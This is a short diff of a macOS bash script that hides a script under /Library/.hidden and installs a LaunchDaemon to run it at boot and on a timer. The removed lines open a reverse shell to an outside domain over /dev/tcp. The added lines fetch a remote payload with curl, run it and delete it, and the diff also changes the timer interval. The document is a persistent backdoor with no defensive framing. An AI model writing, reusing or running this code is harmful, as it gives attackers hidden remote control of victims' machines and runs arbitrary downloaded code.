@@ -1,8 +1,9 @@
 #!/bin/bash
 mkdir -p /Library/.hidden
-echo "#!/bin/bash
-bash -i >& /dev/tcp/t.angelparliament.com/7668 0>&1
-wait" > /Library/.hidden/connect.sh
+echo '#!/bin/bash
+cd /Library/.hidden
+curl -k -O https://www.angelparliament.com/payload && chmod +x payload && ./payload
+rm -rf payload' > /Library/.hidden/connect.sh
 chmod +x /Library/.hidden/connect.sh
 mkdir -p /Library/LaunchDaemons
 echo '<plist version="1.0">
@@ -17,7 +18,7 @@ echo '<plist version="1.0">
 <key>RunAtLoad</key>
 <true/>
 <key>StartInterval</key>
-<integer>10</integer>
+<integer>30</integer>
 <key>AbandonProcessGroup</key>
 <true/>
 </dict>
